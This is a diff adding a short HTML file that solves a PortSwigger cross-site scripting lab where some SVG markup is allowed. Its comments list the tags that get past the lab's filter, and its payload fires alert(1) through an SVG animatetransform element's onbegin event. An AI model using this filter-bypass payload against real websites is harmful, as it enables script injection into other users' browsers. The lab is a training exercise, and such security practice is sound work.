@@ -1,0 +1,15 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed -->
+
+<!-- The following 4 tags bypass the filter (That I know of):-->
+
+<img>
+<animatetransform></animatetransform>
+<title></title>
+<svg></svg>
+
+<!-- The only event that bypasses the filter is "onbegin", leaving us with the following payload: -->
+
+<svg>
+    <animatetransform onbegin=alert(1) attributeName=transform></animatetransform>
+</svg>
